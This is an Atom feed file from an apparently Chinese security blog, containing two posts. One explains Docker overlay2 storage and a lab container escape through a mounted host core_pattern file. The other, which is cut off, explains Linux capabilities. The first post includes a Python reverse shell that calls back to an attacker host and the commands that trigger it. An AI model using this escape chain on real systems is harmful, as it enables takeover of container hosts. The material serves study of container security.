@@ -1,0 +1,2022 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://skyblu3519.github.io</id>
+    <title>skkyblu3</title>
+    <updated>2024-05-11T15:54:30.944Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://skyblu3519.github.io"/>
+    <link rel="self" href="https://skyblu3519.github.io/atom.xml"/>
+    <logo>https://skyblu3519.github.io/images/avatar.png</logo>
+    <icon>https://skyblu3519.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, skkyblu3</rights>
+    <entry>
+        <title type="html"><![CDATA[[Docker容器安全3]Docker文件存储 & 挂载宿主机 procfs 容器逃逸]]></title>
+        <id>https://skyblu3519.github.io/post/docker-rong-qi-an-quan-3docker-wen-jian-cun-chu-and-gua-zai-su-zhu-ji-procfs-rong-qi-tao-yi/</id>
+        <link href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-3docker-wen-jian-cun-chu-and-gua-zai-su-zhu-ji-procfs-rong-qi-tao-yi/">
+        </link>
+        <updated>2024-05-11T15:35:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="docker文件存储背景知识">Docker文件存储背景知识</h1>
+<h2 id="docker-镜像">Docker 镜像</h2>
+<p>Docker 镜像是一个由多个层（layers）组成的只读模板。这些层堆叠在一起，构成了一个完整的文件系统，镜像可以用来创建容器。</p>
+<h2 id="层layer">层（Layer）</h2>
+<p>每个层通常对应于 Dockerfile 中的一条指令（如 FROM、COPY、RUN 等）。这些层是只读的，并且通过叠加技术（union file system）组合在一起，形成了镜像的最终内容。</p>
+<h2 id="层的堆叠和镜像">层的堆叠和镜像</h2>
+<ul>
+<li>只读层：这些层是只读的，并且是镜像的一部分。每个层包含了与前一层的差异部分。这些层共同构成了镜像的文件系统。</li>
+<li>可写层：当容器启动时，会在镜像的所有只读层之上添加一个新的可写层，这一层是容器专有的，存储运行容器时的所有变更。</li>
+<li>每个容器都有其自己的可写容器层，并且所有更改都存储在该容器层中，所以多个容器可以共享对同一基础映像的访问，但具有自己的数据状态。下</li>
+</ul>
+<p><img src="https://skyblu3519.github.io/post-images/1715441777002.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1715441784258.png" alt="" loading="lazy"></p>
+<h2 id="写时复制copy-on-write-cow机制">写时复制（Copy-on-Write, CoW）机制</h2>
+<p>当容器中的文件被修改时，存储驱动程序会执行写时复制操作，以确保只读层不被修改，并将更改写入到可写层中。具体步骤如下：</p>
+<ol>
+<li>查找文件：当需要修改一个文件时，存储驱动程序首先会在镜像层中搜索该文件。这个过程从最新的镜像层开始，一层一层向下搜索，直到找到文件为止。</li>
+<li>Copy-up操作：一旦找到文件，存储驱动程序会将该文件的副本复制到可写容器层中。这个过程称为“copy-up”操作。</li>
+<li>修改文件：文件被复制到可写层后，所有对该文件的修改都会在可写层中进行。容器中的进程将只能看到可写层中的修改后的文件，而不会再访问只读层中的原始文件。</li>
+</ol>
+<p>不同的存储驱动程序（如 AUFS、OverlayFS、Overlay2）处理写时复制操作的具体方式可能有所不同，OverlayFS是推荐的存储驱动程序。</p>
+<h2 id="overlay2存储驱动">Overlay2存储驱动</h2>
+<p>OverlayFS 是 Linux 内核中一种联合文件系统，它允许将多个目录合并为一个逻辑上的单一目录结构。其核心概念是通过将多个层（通常是只读层和一个可写层）合并，提供一个统一的文件系统视图。</p>
+<h3 id="主要概念">主要概念</h3>
+<ul>
+<li>lowerdir：只读层，包含基础文件系统。</li>
+<li>upperdir：可写层，记录所有的写操作。</li>
+<li>workdir：工作目录，OverlayFS 操作所需的临时存储。</li>
+</ul>
+<p>overlay 和 overlay2 是 Docker 中基于 OverlayFS 的两种存储驱动程序。</p>
+<h3 id="overlay">overlay</h3>
+<ul>
+<li>overlay 是最早的基于 OverlayFS 的存储驱动程序。</li>
+<li>它支持简单的两层结构（一个 lowerdir 和一个 upperdir）。</li>
+<li>对于较大的镜像和大量层的场景，性能和可扩展性方面有一定的局限性。</li>
+</ul>
+<h3 id="overlay2">overlay2</h3>
+<ul>
+<li>overlay2 是改进后的存储驱动程序，克服了 overlay 的一些局限性。</li>
+<li>支持多层结构（multiple lowerdirs），即可以将多个只读层（lowerdir）叠加起来，进一步提高了灵活性和可扩展性。</li>
+<li>在性能和稳定性方面都有所提升，适合处理更复杂的镜像和层次结构。</li>
+</ul>
+<h3 id="测试">测试</h3>
+<p>使用<code>docker info</code>查看docker使用的文件驱动</p>
+<pre><code># docker info | grep &quot;Storage Driver&quot;
+...
+ Storage Driver: overlay2
+  Backing Filesystem: extfs
+  Supports d_type: true
+  Using metacopy: false
+  Native Overlay Diff: true
+  userxattr: false
+...
+</code></pre>
+<p>拉取一个ubuntu:20.04镜像：</p>
+<pre><code># docker pull ubuntu:20.04
+20.04: Pulling from library/ubuntu
+d4c3c94e5e10: Pull complete
+Digest: sha256:874aca52f79ae5f8258faff03e10ce99ae836f6e7d2df6ecd3da5c1cad3a912b
+Status: Downloaded newer image for ubuntu:20.04
+docker.io/library/ubuntu:20.04
+</code></pre>
+<p>镜像拉取了一层，查看 overlay2 的目录：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/
+total 8
+drwx--x--- 3 root root 4096 May 11 18:38 105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6
+drwx------ 2 root root 4096 May 11 18:38 l
+</code></pre>
+<p>overlay2 目录下出现了一个镜像层目录和一个<code>l</code>目录，首先来查看一下<code>l</code>目录的内容：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/l
+total 4
+lrwxrwxrwx 1 root root 72 May 11 18:38 DT325SQS52JQUKKHRELWLMM64Z -&gt; ../105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/diff
+</code></pre>
+<p>可以看到l目录是一堆软连接，把一些较短的随机串软连到镜像层的 diff 文件夹下，这样做是为了避免达到mount命令参数的长度限制。</p>
+<p>再看下这个镜像层中的内容：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/
+total 8
+drwxr-xr-x 17 root root 4096 May 11 18:39 diff
+-rw-r--r--  1 root root   26 May 11 18:38 link
+</code></pre>
+<p>这里包含 diff目录 和 link文件：</p>
+<ul>
+<li>diff目录：包含了该层的所有文件和目录内容。这是一个可写层，存储了在该层中所做的所有更改。<br>
+<img src="https://skyblu3519.github.io/post-images/1715442172976.png" alt="" loading="lazy"></li>
+<li>link文件：内容为该镜像层的短 ID</li>
+</ul>
+<pre><code># cat /var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/link
+DT325SQS52JQUKKHRELWLMM64Z
+</code></pre>
+<p>在 Docker 镜像或容器的详细信息中，<code>GraphDriver</code> 部分提供了关于存储驱动程序的具体信息。</p>
+<pre><code># docker inspect ubuntu:20.04
+
+......省略部分
+&quot;GraphDriver&quot;: {
+    &quot;Data&quot;: {
+        &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/merged&quot;,
+        &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/diff&quot;,
+        &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/work&quot;
+    },
+    &quot;Name&quot;: &quot;overlay2&quot;
+},
+......
+</code></pre>
+<p>字段解释：</p>
+<ul>
+<li>Name: 指定存储驱动程序的名称。这里面，存储驱动程序为 overlay2。</li>
+<li>Data: 包含与 overlay2 存储驱动程序相关的具体目录信息。
+<ul>
+<li>MergedDir: 指向合并目录，该目录提供了容器运行时的统一视图。当容器运行时，MergedDir 是实际挂载点，它将多个只读层和一个可写层合并在一起，提供一个完整的文件系统视图。</li>
+<li>UpperDir: 指向上层目录，该目录包含可写层的内容。当容器对文件系统进行写操作时，修改会写入 UpperDir。这是写时复制（Copy-on-Write）机制的一部分。</li>
+<li>WorkDir: 指向工作目录，该目录用于 OverlayFS 的临时存储操作。WorkDir 是 OverlayFS 所需的，支持文件系统操作如创建和删除文件时的临时存储。</li>
+</ul>
+</li>
+</ul>
+<p>启动容器</p>
+<pre><code>docker run -d --name=ubt ubuntu: 20.04 tail -f /dev/null
+</code></pre>
+<p><code>/var/lib/docker/overlay2/</code>多了个表示容器层的目录</p>
+<pre><code># ls -l /var/lib/docker/overlay2/
+total 12
+drwx--x--- 3 root root 4096 May 11 21:44 105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6
+drwx--x--- 5 root root 4096 May 11 21:44 76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8
+drwx------ 2 root root 4096 May 11 21:44 l
+</code></pre>
+<p>查看容器层目录内容</p>
+<pre><code># ls -l /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8
+total 20
+drwxr-xr-x 2 root root 4096 May 11 21:44 diff
+-rw-r--r-- 1 root root   26 May 11 21:44 link
+-rw-r--r-- 1 root root   57 May 11 21:44 lower
+drwxr-xr-x 1 root root 4096 May 11 21:44 merged
+drwx------ 3 root root 4096 May 11 21:44 work
+</code></pre>
+<p>文件解释：</p>
+<ul>
+<li>lower文件：该层依赖的所有下层的目录路径。<code>l</code>目录下的短链接</li>
+<li>merged目录：提供容器的合并文件系统视图。所有对文件系统的访问都会通过这个合并视图。</li>
+<li>work 目录: 用于 OverlayFS 操作的临时存储。</li>
+</ul>
+<p>在容器中写入一个文件<code>/home/test</code>，它会出现在<code>diff</code>和<code>merged</code>目录中</p>
+<pre><code># tree /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/diff/
+/var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/diff/
+├── home
+│   └── test
+└── root
+
+
+# tree /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/merged/home/
+/var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/merged/home/
+└── test
+</code></pre>
+<h1 id="挂载宿主机-procfs-逃逸">挂载宿主机 procfs 逃逸</h1>
+<h2 id="背景">背景</h2>
+<p><code>/proc/sys/kernel/core_pattern</code>文件用于配置生成进程核心转储（core dump）文件的模式，其内容定义了核心转储文件的命名模式和存储位置。当一个程序崩溃时，操作系统会生成一个核心转储文件，其中包含进程的内存快照、寄存器状态等信息。</p>
+<p>从 2.6.19 内核版本开始，Linux 支持在 <code>/proc/sys/kernel/core_pattern</code> 中使用新语法。如果该文件中的首个字符是管道符<code>|</code>，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</p>
+<pre><code class="language-shell">|/usr/local/bin/core_handler %p %u %g %s %t %h %e
+</code></pre>
+<p>这样，当一个程序崩溃时，核心转储信息会被传递给 <code>/usr/local/bin/core_handler</code> 脚本进行处理。其中占位符的解释：</p>
+<ul>
+<li><code>%p</code>：进程 ID</li>
+<li><code>%u</code>：用户 ID</li>
+<li><code>%g</code>：组 ID</li>
+<li><code>%s</code>：进程的信号号</li>
+<li><code>%t</code>：时间戳</li>
+<li><code>%h</code>：主机名</li>
+<li><code>%e</code>：可执行文件名</li>
+</ul>
+<h2 id="攻击思路">攻击思路</h2>
+<p>所以这个的原理就是当<code>/proc/sys/kernel/core_pattern</code>被挂载到容器中时，可以在容器中写一个恶意脚本，根据前面的知识这个脚本在真实主机中的位置是可以找到的。然后编辑<code>/proc/sys/kernel/core_pattern</code>使用管道符指向该脚本，再写一个可以使进程崩溃的脚本触发，让物理执行这个脚本，进而获得物理机的shell实现容器逃逸。</p>
+<h2 id="实验">实验</h2>
+<p>创建一个容器并挂载 <code>/proc</code> 目录</p>
+<pre><code class="language-shell">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
+</code></pre>
+<p>如果找到两个 <code>core_pattern</code> 文件，那可能就是挂载了宿主机的 procfs</p>
+<pre><code class="language-shell">find / -name core_pattern
+</code></pre>
+<p>查看容器的挂载路径</p>
+<pre><code class="language-shell">mount | grep overlay
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1715442187875.png" alt="" loading="lazy"></figure>
+<p>从返回可以知道，写文件在物理机的路径为</p>
+<pre><code class="language-shell">/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/diff
+/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/merged
+</code></pre>
+<p>安装 vim 和 gcc</p>
+<pre><code class="language-shell">apt-get update -y &amp;&amp; apt-get install vim gcc -y
+</code></pre>
+<p>创建一个反弹 Shell 的 py 脚本<code>/tmp/.t.py</code></p>
+<pre><code class="language-python">#!/usr/bin/python3
+import  os
+import pty
+import socket
+lhost = &quot;IP&quot;
+lport = 9999
+def main():
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((lhost, lport))
+   os.dup2(s.fileno(), 0)
+   os.dup2(s.fileno(), 1)
+   os.dup2(s.fileno(), 2)
+   os.putenv(&quot;HISTFILE&quot;, '/dev/null')
+   pty.spawn(&quot;/bin/bash&quot;)
+   # os.remove('/tmp/.t.py')
+   s.close()
+if __name__ == &quot;__main__&quot;:
+   main()
+</code></pre>
+<p>给 Shell 赋予执行权限</p>
+<pre><code class="language-python">chmod 777 /tmp/t.py
+</code></pre>
+<p>写入反弹 shell 到目标的 proc 目录下</p>
+<pre><code class="language-python">echo -e &quot;|/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/merged/tmp/t.py \rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern
+</code></pre>
+<p>在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序</p>
+<pre><code class="language-c">vim t.c
+#include&lt;stdio.h&gt;
+int main(void)  {
+   int *a  = NULL;
+   *a = 1;
+   return 0;
+}
+gcc t.c -o t
+./t
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[Docker容器安全2]Linux Capabilities & 特权模式容器逃逸]]></title>
+        <id>https://skyblu3519.github.io/post/docker-rong-qi-an-quan-2linux-capabilities-and-te-quan-mo-shi-rong-qi-tao-yi/</id>
+        <link href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-2linux-capabilities-and-te-quan-mo-shi-rong-qi-tao-yi/">
+        </link>
+        <updated>2024-05-10T13:47:38.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="笔记">笔记</h1>
+<p>学习下Linux capabilities</p>
+<h2 id="概念">概念</h2>
+<p>Linux capabilities 将 root 权限划分为较小的、独立的单元，使进程可以拥有部分权限，以对 root 权限进行更细粒度的控制。</p>
+<h2 id="有哪些">有哪些？</h2>
+<table>
+<thead>
+<tr>
+<th>capability 名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CAP_AUDIT_CONTROL</td>
+<td>启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_READ</td>
+<td>允许通过 multicast netlink 套接字读取审计日志</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_WRITE</td>
+<td>将记录写入内核审计日志</td>
+</tr>
+<tr>
+<td>CAP_BLOCK_SUSPEND</td>
+<td>使用可以阻止系统挂起的特性</td>
+</tr>
+<tr>
+<td>CAP_CHOWN</td>
+<td>修改文件所有者的权限</td>
+</tr>
+<tr>
+<td>CAP_DAC_OVERRIDE</td>
+<td>忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td>CAP_DAC_READ_SEARCH</td>
+<td>忽略文件读及目录搜索的 DAC 访问限制</td>
+</tr>
+<tr>
+<td>CAP_FOWNER</td>
+<td>忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>
+</tr>
+<tr>
+<td>CAP_FSETID</td>
+<td>允许设置文件的 setuid 位</td>
+</tr>
+<tr>
+<td>CAP_IPC_LOCK</td>
+<td>允许锁定共享内存片段</td>
+</tr>
+<tr>
+<td>CAP_IPC_OWNER</td>
+<td>忽略 IPC 所有权检查</td>
+</tr>
+<tr>
+<td>CAP_KILL</td>
+<td>允许对不属于自己的进程发送信号</td>
+</tr>
+<tr>
+<td>CAP_LEASE</td>
+<td>允许修改文件锁的 FL_LEASE 标志</td>
+</tr>
+<tr>
+<td>CAP_LINUX_IMMUTABLE</td>
+<td>允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>
+</tr>
+<tr>
+<td>CAP_MAC_ADMIN</td>
+<td>允许 MAC 配置或状态更改</td>
+</tr>
+<tr>
+<td>CAP_MAC_OVERRIDE</td>
+<td>忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td>CAP_MKNOD</td>
+<td>允许使用 mknod() 系统调用</td>
+</tr>
+<tr>
+<td>CAP_NET_ADMIN</td>
+<td>允许执行网络管理任务</td>
+</tr>
+<tr>
+<td>CAP_NET_BIND_SERVICE</td>
+<td>允许绑定到小于 1024 的端口</td>
+</tr>
+<tr>
+<td>CAP_NET_BROADCAST</td>
+<td>允许网络广播和多播访问</td>
+</tr>
+<tr>
+<td>CAP_NET_RAW</td>
+<td>允许使用原始套接字</td>
+</tr>
+<tr>
+<td>CAP_SETGID</td>
+<td>允许改变进程的 GID</td>
+</tr>
+<tr>
+<td>CAP_SETFCAP</td>
+<td>允许为文件设置任意的 capabilities</td>
+</tr>
+<tr>
+<td>CAP_SETPCAP</td>
+<td>参考 capabilities man page</td>
+</tr>
+<tr>
+<td>CAP_SETUID</td>
+<td>允许改变进程的 UID</td>
+</tr>
+<tr>
+<td>CAP_SYS_ADMIN</td>
+<td>允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>
+</tr>
+<tr>
+<td>CAP_SYS_BOOT</td>
+<td>允许重新启动系统</td>
+</tr>
+<tr>
+<td>CAP_SYS_CHROOT</td>
+<td>允许使用 chroot() 系统调用</td>
+</tr>
+<tr>
+<td>CAP_SYS_MODULE</td>
+<td>允许插入和删除内核模块</td>
+</tr>
+<tr>
+<td>CAP_SYS_NICE</td>
+<td>允许提升优先级及设置其他进程的优先级</td>
+</tr>
+<tr>
+<td>CAP_SYS_PACCT</td>
+<td>允许执行进程的 BSD 式审计</td>
+</tr>
+<tr>
+<td>CAP_SYS_PTRACE</td>
+<td>允许跟踪任何进程</td>
+</tr>
+<tr>
+<td>CAP_SYS_RAWIO</td>
+<td>允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td>
+</tr>
+<tr>
+<td>CAP_SYS_RESOURCE</td>
+<td>忽略资源限制</td>
+</tr>
+<tr>
+<td>CAP_SYS_TIME</td>
+<td>允许改变系统时钟</td>
+</tr>
+<tr>
+<td>CAP_SYS_TTY_CONFIG</td>
+<td>允许配置 TTY 设备</td>
+</tr>
+<tr>
+<td>CAP_SYSLOG</td>
+<td>允许使用 syslog() 系统调用</td>
+</tr>
+<tr>
+<td>CAP_WAKE_ALARM</td>
+<td>允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="capabilities-集合">capabilities 集合</h2>
+<p>Linux capabilities 分为进程（Processes） capabilities 和文件（Binaries） capabilities。</p>
+<h3 id="进程processes-capabilities">进程（Processes） capabilities</h3>
+<p>每一个线程，具有 5 个 capabilities 集合，每一个集合使用 64 位掩码来表示，显示为 16 进制格式。这 5 个 capabilities 集合分别是：</p>
+<ul>
+<li><strong>Permitted</strong></li>
+<li><strong>Effective</strong></li>
+<li><strong>Inheritable</strong></li>
+<li><strong>Bounding</strong></li>
+<li><strong>Ambient</strong></li>
+</ul>
+<p>每个集合中都包含零个或多个 capabilities。这5个集合的具体含义如下：</p>
+<p><strong>Inherited (CapInh):</strong></p>
+<ul>
+<li>目的：确定从父进程传递下来的 <code>capabilities</code>。</li>
+<li>功能：当创建（<code>exec()</code>）一个新进程时，它会从父进程继承这个集合中的 <code>capabilities</code>。不会添加到新线程的 <code>Effective</code> 集合中，它只会影响新线程的 <code>Permitted</code> 集合。</li>
+</ul>
+<p><strong>Effective (CapEff):</strong></p>
+<ul>
+<li>目的：表示进程在任何时刻实际使用的 <code>capabilities</code>。</li>
+<li>功能：是内核检查各种操作权限时使用的<code>capabilities</code>集合。</li>
+</ul>
+<p><strong>Permitted (CapPrm)：</strong></p>
+<ul>
+<li>目的：定义进程可以拥有的最大<code>capabilities</code>集合。</li>
+<li>功能：线程可以从 <code>Effective</code> 或 <code>Inheritable</code> 集合中添加或删除 <code>capability</code>，前提是添加或删除的 <code>capability</code> 必须包含在 <code>Permitted</code> 集合中。</li>
+</ul>
+<p><strong>Bounding (CapBnd):</strong></p>
+<ul>
+<li>目的：限制进程在其生命周期内可获得的<code>capabilities</code>能力集合。</li>
+<li>功能：即使某个<code>capabilities</code>在进程的<code>Inheritable</code>或<code>Permitted</code>集合中，它也不能获得该<code>capabilities</code>，除非它也在<code>Bounding</code>集合中。</li>
+</ul>
+<p><strong>Ambient (CapAmb):</strong></p>
+<ul>
+<li>Linux 4.3 内核新增了一个 capabilities 集合叫 Ambient ，用来弥补 Inheritable 的不足。Ambient 具有如下特性：
+<ul>
+<li><code>Permitted</code> 和 <code>Inheritable</code> 未设置的 <code>capabilities</code>，<code>Ambient</code> 也不能设置。</li>
+<li>当 <code>Permitted</code> 和 <code>Inheritable</code> 关闭某权限（比如 <code>CAP_SYS_BOOT</code>）后，<code>Ambient</code> 也随之关闭对应权限。这样就确保了降低权限后子进程也会降低权限。</li>
+<li>非特权用户如果在 <code>Permitted</code> 集合中有一个 <code>capability</code>，那么可以添加到 <code>Ambient</code> 集合中，这样它的子进程便可以在 <code>Ambient</code>、<code>Permitted</code> 和 <code>Effective</code> 集合中获取这个 <code>capability</code></li>
+<li>有点抽象，在具体的使用场景感受</li>
+</ul>
+</li>
+</ul>
+<h3 id="文件binaries-capabilities">文件（Binaries） capabilities</h3>
+<p>文件的 capabilities 功能，需要文件系统的支持。如果文件系统使用了 nouuid 选项进行挂载，那么文件的 capabilities 将会被忽略。</p>
+<p>类似于线程的 capabilities，文件的 capabilities 包含了 3 个集合：</p>
+<ul>
+<li>Permitted</li>
+<li>Inheritable</li>
+<li>Effective</li>
+</ul>
+<p>和线程 capabilities 有较大差异的是<code>Effective</code>集合：</p>
+<p><strong>Effective</strong><br>
+这不是一个集合，仅仅是一个标志位。如果设置开启，那么在执行完 <code>execve()</code> 后，线程 <code>Permitted</code> 集合中的 <code>capabilities</code> 会自动添加到它的 Effective 集合中。对于一些旧的可执行文件，由于其不会调用 capabilities 相关函数设置自身的 <code>Effective</code> 集合，所以可以将可执行文件的 Effective bit 开启，从而可以将 <code>Permitted</code> 集合中的 capabilities 自动添加到 <code>Effective</code> 集合中。</p>
+<h2 id="公式运行-execve-后-capabilities-的变化">公式：运行 execve() 后 capabilities 的变化</h2>
+<p>我们用 <code>P</code> 代表<strong>执行 execve() 前线程的 capabilities</strong>，<code>P'</code> 代表<strong>执行 execve() 后线程的 capabilities</strong>，<code>F</code> 代表<strong>可执行文件的 capabilities</strong>。那么：</p>
+<pre><code>P’(ambient) = (file is privileged) ? 0 : P(ambient)
+
+P’(permitted) = (P(inheritable) &amp; F(inheritable)) |
+                (F(permitted) &amp; P(bounding))) | 
+                P’(ambient)
+
+P’(effective)   = F(effective) ? P’(permitted) : P’(ambient)
+
+P’(inheritable) = P(inheritable) [i.e., unchanged]
+
+P’(bounding) = P(bounding) [i.e., unchanged]
+</code></pre>
+<p>注：</p>
+<ul>
+<li>上面的公式是针对系统调用 <code>execve()</code> 的，如果是 <code>fork()</code>，那么子线程的 capabilities 信息完全复制父进程的 capabilities 信息。</li>
+</ul>
+<h2 id="capabilities-操作">capabilities 操作</h2>
+<h3 id="查看-capabilities">查看 capabilities</h3>
+<p>相关工具：<code>libcap-ng</code></p>
+<p>安装（Centos）：<code>yum install libcap-ng-utils</code></p>
+<p>使用<code>/proc/&lt;pid&gt;/status</code>查看进程capabilities</p>
+<pre><code class="language-shell">cat /proc/1234/status | grep Cap
+cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
+</code></pre>
+<p>通常有5行</p>
+<pre><code>CapInh:	0000000000000000
+CapPrm:	0000001fffffffff
+CapEff:	0000001fffffffff
+CapBnd:	0000001fffffffff
+CapAmb:	0000000000000000
+</code></pre>
+<p>使用<code>capsh</code>解码让其可读</p>
+<pre><code># capsh --decode=0000003fffffffff
+0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36,37
+</code></pre>
+<p>使用 getpcaps 工具</p>
+<pre><code># ping baidu.com &gt; /dev/null&amp;
+[1] 9227
+# getpcaps 9227
+Capabilities for `9227': = cap_net_admin,cap_net_raw+p
+# cat /proc/9227/status | grep Cap
+CapInh:	0000000000000000
+CapPrm:	0000000000003000
+CapEff:	0000000000000000
+CapBnd:	0000001fffffffff
+CapAmb:	0000000000000000
+# capsh --decode=0000000000003000
+0x0000000000003000=cap_net_admin,cap_net_raw
+</code></pre>
+<p>注意到这里启动的 ping 它的 CapEff 是 0，这点后面会提（应该）</p>
+<p>文件capabilities查看</p>
+<pre><code>getcap /usr/bin/ping
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+
+###
+capability[,capability…]+(e|i|p)，其中 e 表示 effective，i 表示 inheritable，p 表示 permitted。不同的分组之间通过空格隔开，例如：Current: = cap_sys_chroot+ep cap_net_bind_service+eip。再举一个例子，cap_net_bind_service+e cap_net_bind_service+ip 和 cap_net_bind_service+eip 等价。
+</code></pre>
+<p>遍历目录下所有可执行文件的capabilities（<code>2&gt;/dev/null</code> 则是将错误输出重定向到 <code>/dev/null</code>，即忽略错误消息）</p>
+<pre><code># getcap -r / 2&gt;/dev/null
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/newgidmap = cap_setgid+ep
+</code></pre>
+<h3 id="使用capsh设置的新shell">使用capsh设置的新shell</h3>
+<p>使用 capsh 工具在运行 ping 之前移除 CAP_NET_RAW capabilities，并输出当前权限设置。</p>
+<pre><code># capsh --drop=cap_net_raw --print -- -c &quot;ping baidu.com&quot;
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root),994(docker)
+ping: socket: 不允许的操作
+</code></pre>
+<h3 id="使用setcap设置文件的capabilities">使用setcap设置文件的capabilities</h3>
+<p>设置新的限制</p>
+<pre><code>setcap cap_net_admin+p /usr/bin/ping
+</code></pre>
+<p>也可以清空capabilities</p>
+<pre><code>setcap -r &lt;/path/to/binary&gt;
+</code></pre>
+<h2 id="具有-capabilities-感知能力的文件">具有 capabilities 感知能力的文件</h2>
+<p>这部分的内容开始看的时候有点难理解，之后在HackTrick找了段英文的解释</p>
+<blockquote>
+<p>The capability-aware binaries won't use the new capabilities given by the environment, however the capability dumb binaries will use them as they won't reject them. This makes capability-dumb binaries vulnerable inside a special environment that grant capabilities to binaries.</p>
+</blockquote>
+<p><strong>Capability-aware Binaries（具有能力感知的二进制文件）：</strong></p>
+<ul>
